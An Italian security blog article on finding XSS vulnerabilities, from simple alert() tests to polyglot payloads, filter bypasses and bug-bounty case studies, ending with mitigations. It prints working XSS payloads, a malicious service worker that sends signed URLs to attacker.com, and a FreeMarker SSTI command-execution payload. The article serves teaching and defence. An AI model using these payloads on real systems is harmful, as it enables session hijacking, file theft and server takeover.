---
title: "Ricerca efficace di vulnerabilità XSS: da alert() a RCE | DevSense"
description: "Padroneggia l'arte di trovare ed sfruttare il Cross-Site Scripting (XSS). Impara a creare payload universali, aggirare i filtri e scalare XSS a RCE."
published: 2026-07-03
faq:
  - question: "Cosa rende una stringa di test un payload XSS universale (poliglotta)?"
    answer: "Un payload XSS universale è progettato per essere eseguito con successo in più contesti HTML (attributi, testo normale, script o stili) chiudendo tag/virgolette esistenti e inserendo un tag attivo (come un iframe) senza interrompere il parser HTML del browser."
  - question: "In che modo un Service Worker può dirottare un bucket S3 per un attacco XSS?"
    answer: "Se un'applicazione distribuisce file utente da un bucket S3 condiviso sotto lo stesso Origin, un utente malintenzionato può caricare un Service Worker dannoso. Una vez registrato, intercetta tutte le future richieste di file all'interno del suo scope, consentendo di rubare firme temporanee ed esfiltrare file."
  - question: "Qual è la differenza tra l'iniezione di template lato client e SSTI?"
    answer: "L'iniezione di template lato client (come AngularJS/VueJS) esegue JavaScript nel browser della vittima utilizzando espressioni di template renderizzate lato client. La Server-Side Template Injection (SSTI) esegue il codice direttamente sul server web all'interno di template come FreeMarker o Twig, portando spesso all'esecuzione remota di comandi (RCE)."
---

# Ricerca efficace di vulnerabilità XSS: da alert() a RCE

La scoperta di vulnerabilità di sicurezza è spesso vista come un'arte segreta riservata ad hacker d'élite. Tuttavia, le minacce lato client come il **Cross-Site Scripting (XSS)** seguono un modello logico e strutturato. Comprendendo il modo in cui il browser analizza l'HTML e imparando a costruire payload universali, qualsiasi sviluppatore o ingegnere QA può identificare efficacemente i bug XSS.

In questa guida, basata sulle presentazioni di Heisenbug e sull'esperienza reale nel Bug Bounty, costruiremo una solida metodologia per rilevare XSS, impareremo come costruire payload avanzati ed esploreremo casi reali in cui semplici iniezioni sono degenerate fino al controllo del server.

---

## Indice

* [Cos'è l'XSS e perché si verifica la vulnerabilità](#what-is-xss)
* [La metodologia di ricerca manuale](#hunting-methodology)
* [Costruzione del payload universale (dal Livello 0 al 1337)](#universal-payloads)
* [Aggirare i filtri nel mondo reale](#bypassing-restrictions)
* [Casi di studio reali di Bug Bounty](#case-studies)
    * [Aggiramento di espressioni regolari su biz.mail.ru](#case-mailru)
    * [Attacco a bucket S3 tramite Service Worker](#case-s3)
    * [Iniezione HTML nelle e-mail e FreeMarker RCE](#case-ssti)
* [Mitigazione & Difesa](#mitigations)

---

<a id="what-is-xss"></a>
## Cos'è l'XSS e perché si verifica la vulnerabilità

Il **Cross-Site Scripting (XSS)** è una vulnerabilità che consente a un utente malintenzionato di eseguire codice JavaScript arbitrario nel browser di una vittima all'interno del contesto di sicurezza (Origin) del sito web di destinazione.

Si verifica quando un'applicazione web accetta input non attendibili dall'utente e li include nella pagina HTML generata senza un'adeguata codifica o sanificazione. I browser non riescono a distinguere tra il codice originale del sito e i tag iniettati; eseguono semplicemente qualsiasi tag HTML e codice JavaScript che incontrano.

Tipicamente classifichiamo l'XSS in:
* **Stored XSS (Persistente):** Il codice dannoso viene memorizzato nel database (ad esempio, nome utente, commento) e visualizzato successivamente ad altri utenti.
* **Reflected XSS (Non persistente):** Il codice dannoso viene riflesso immediatamente nella risposta del server, solitamente tramite un parametro URL o il corpo di una richiesta POST.

---

<a id="hunting-methodology"></a>
## La metodologia di ricerca manuale

Gli scanner automatici spesso trascurano vulnerabilità logiche e falliscono con i filtri di sicurezza. Un approccio manuale di tipo black-box funziona in modo molto più affidabile:

1. **Inserisci una stringa di test unica** (ad esempio, `qweqwe`) in ogni campo di input, parametro URL, intestazione o modulo di caricamento.
2. **Esamina il DOM della pagina.** Apri i DevTools (`F12`), cerca la tua stringa (`Ctrl+F`) e osserva quante volte appare nella pagina.
3. **Analizza il contesto dell'iniezione.** Dove è stata inserita la stringa? In testo normale? In un attributo `value`? All'interno di un blocco `<script>`?
4. **Verifica i caratteri speciali** (`' " < > &`) per vedere se sono codificati (convertiti in entità HTML come `&quot;`, `&lt;`, `&gt;`) o se vengono mostrati in formato grezzo.
5. **Costruisci e scala il payload** in base ai caratteri consentiti.

---

<a id="universal-payloads"></a>
## Costruzione del payload universale (dal Livello 0 al 1337)

Invece di adattare il codice a ciascun campo manualmente, i cacciatori di bug utilizzano **payload universali** progettati per rompere più contesti di inserimento contemporaneamente.

### Livello 0: Il principiante
`"<script>alert()</script>"`
Questo funzionerà solo se lo sviluppatore stampa l'input direttamente nel testo HTML:
```html
<p>Benvenuto, Utente <script>alert()</script>!</p>
```

### Livello 1: Fuga dagli attributi
Se l'input cade all'interno dell'attributo di un tag, la variante precedente fallisce perché rimane all'interno delle virgolette:
```html
<input name="search" value="<script>alert()</script>">
```
Dobbiamo chiudere le virgolette e il tag stesso: `">`
Nuovo payload: `"><script>alert()</script>`
```html
<input name="search" value=""><script>alert()</script>">
```

### Livello 2: Fuga dai tag di servizio
Se la stringa cade all'interno di tag come `<title>`, `<style>`, `<textarea>` o `<script>`, il browser tratta tutti i dati come testo o codice JS e non esegue il rendering dei tag HTML.
Dobbiamo prima chiudere quei tag.
Nuovo payload: `"></title></script><script>alert()</script>`

Cosa succede se lo sviluppatore ha racchiuso l'attributo tra virgolette singole? Aggiungiamo `'` all'inizio:
Nuovo payload: `'">></title></script><script>alert()</script>`

### Livello 3: Utilizzo di iframe
Il tag `<script>` viene spesso bloccato dai WAF (Web Application Firewall). Al suo posto, è preferibile utilizzare un `<iframe>` con l'evento `onload`:
Nuovo payload: `'">></title></script><iframe onload='alert()'>`

Il frame esegue il codice JavaScript nell'attributo `onload` subito dopo il rendering, anche senza specificare una sorgente `src`.

### Livello 1337: Slash e poliglotti
I filtri avanzati rimuovono gli spazi o cercano parentesi di chiusura. Possiamo evitarli se:
* Sostituiamo gli spazi con barre diagonali (`/`).
* Permettiamo al browser di chiudere il tag da solo (rimuoviamo `>`).
* Chiudiamo i possibili commenti HTML (`-->`).
* Iniettiamo espressioni di framework lato client come AngularJS o VueJS (`{{7*7}}`).

Il payload universale finale:
```html
'"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--
```

Se inserito in un attributo, produce:
```html
<input name="search" value=''"/test/></title/></script/></style/-->{{7*7}}<iframe/onload='alert`1``<!--'>
```
Qui viene creato con successo il nostro attributo `test`, la cui presenza può essere facilmente verificata con uno script in console:
```javascript
if (document.querySelectorAll('*[test]').length > 0) {
    console.log("XSS rilevato tramite iniezione di attributo!");
}
```

---

<a id="bypassing-restrictions"></a>
## Aggirare i filtri nel mondo reale

### 1. Tag non chiusi contro espressioni regolari
Se un filtro rimuove tutte le strutture del tipo `<...>`, è possibile inviare un tag non chiuso:
```html
<iframe/onload='alert()'
```
Il browser analizzerà la stringa, incontrerà la fine del documento, aggiungerà la parentesi di chiusura da solo ed eseguirà lo script.

### 2. Spazi negli schemi URL
Durante la verifica dei parametri di reindirizzamento (ad esempio, `returnUrl`), gli sviluppatori spesso verificano se la stringa inizia con la parola `javascript:`.
* **Aggiramento con spazio:** L'inserimento di uno spazio o di una tabulazione prima dello schema (`%20javascript:alert()`) evita la verifica semplice `startsWith`, mentre il browser considera ancora lo schema come valido ed esegue il codice.
* **Sintassi URL:** Una costruzione del tipo `javascript://google.com/%0aalert()`. Il doppio slash trasforma il testo successivo in un commento JS, e `%0a` (interruzione di riga) lo termina per eseguire `alert()`.

---

<a id="case-studies"></a>
## Casi di studio reali di Bug Bounty

<a id="case-mailru"></a>
### Caso 1: Aggiramento di espressioni regolari su biz.mail.ru
In un progetto di Mail.ru, un errore del server 500 reindirizzava l'utente a una pagina di errore con un parametro `from`. Il pulsante «Aggiorna» portava a quell'indirizzo.
* Il tentativo di inserire `javascript:alert()` veniva sostituito con `https://`.
* L'iniezione di `%20javascript:alert()` (con uno spazio all'inizio) ha aggirato l'espressione regolare. Il collegamento dannoso è stato salvato ed eseguito quando si è fatto clic sul pulsante «Aggiorna».

<a id="case-s3"></a>
### Caso 2: Attacco a bucket S3 tramite Service Worker
In un'applicazione CRM privata, gli utenti caricavano documenti che venivano memorizzati in un bucket Amazon S3.
All'apertura di un file, il server generava una firma temporanea e reindirizzava al dominio S3.
* Tutti i file degli utenti venivano ospitati sullo stesso sottodominio S3.
* L'utente malintenzionato ha caricato un file HTML con un payload XSS che eseguiva JavaScript all'apertura.
* Per rubare i file di altri utenti, l'utente malintenzionato ha caricato un `serviceworker.js` dannoso:
```javascript
// serviceworker.js
self.addEventListener('fetch', function(event) {
    event.respondWith(
        new Response("<iframe src='https://attacker.com/log?url=" + encodeURIComponent(event.request.url) + "'></iframe>", {
            headers: { 'Content-Type': 'text/html' }
        })
    );
});
```
* È stato inviato un collegamento al file `exploit.html` alla vittima, che ha registrato il Service Worker su tutta la radice del bucket S3.
* Da quel momento in poi, quando la vittima tentava di aprire qualsiasi altro documento riservato nel CRM, il Service Worker intercettava la richiesta e trasmetteva il collegamento firmato temporaneo al server dell'utente malintenzionato.

<a id="case-ssti"></a>
### Caso 3: Iniezione HTML nelle e-mail e FreeMarker RCE
Una piattaforma di marketing consentiva di personalizzare i modelli e-mail HTML.
* L'utente malintenzionato ha inserito le espressioni `${7*7}` e `{{7*7}}` nel modello e-mail.
* Durante l'anteprima dell'e-mail, il server ha calcolato l'espressione e ha mostrato `49`, rivelando una vulnerabilità **SSTI (Server-Side Template Injection)**.
* Il motore di rendering era il motore Java **FreeMarker**. Utilizzando i suoi metodi di esecuzione dei comandi incorporati, l'iniezione è stata scalata all'esecuzione del codice sul server (**RCE**):
```html
[#assign cmd = 'freemarker.template.utility.Execute'?new()]
${cmd('id')}
```
Il comando `id` è stato eseguito sul sistema del server e il risultato (i privilegi di root) è stato mostrato direttamente nella finestra di anteprima dell'e-mail.

---

<a id="mitigations"></a>
## Mitigazione & Difesa

1. **Non fidarti mai dell'input dell'utente:** Convalida tutti i parametri, le intestazioni e i nomi dei file.
2. **Codifica dell'output adatta al contesto:** Applica l'escape dei caratteri speciali a seconda del luogo di visualizzazione:
    * Nel corpo HTML: usa `htmlspecialchars()`.
    * Nel contesto JS: codifica tramite `json_encode()`.
    * Nei collegamenti: consenti solo i protocolli `http`/`https`.
3. **Implementa la Content Security Policy (CSP):** Intestazioni CSP rigide vietano l'esecuzione di script inline e limitano le origini di caricamento delle risorse.
4. **Isola i file degli utenti:** Ospita il contenuto caricato su un dominio completamente separato (ad esempio, `my-app-files.com`), privo di cookie di sessione e senza accesso all'API principale.
5. **Proteggi i motori di template:** Disabilita l'accesso alle API di sistema e agli ambienti di isolamento (sandbox) durante l'esecuzione dei template utente in FreeMarker, Twig o Blade.
